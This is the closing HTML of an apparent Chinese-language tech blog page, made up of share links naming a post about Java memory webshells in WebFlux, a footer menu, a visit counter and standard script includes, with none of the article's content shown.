  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&title=Java内存马篇——WebFLux型"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&name=Java内存马篇——WebFLux型&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/10/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87%E2%80%94%E2%80%94WebFlux%E5%9E%8B/&t=Java内存马篇——WebFLux型"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
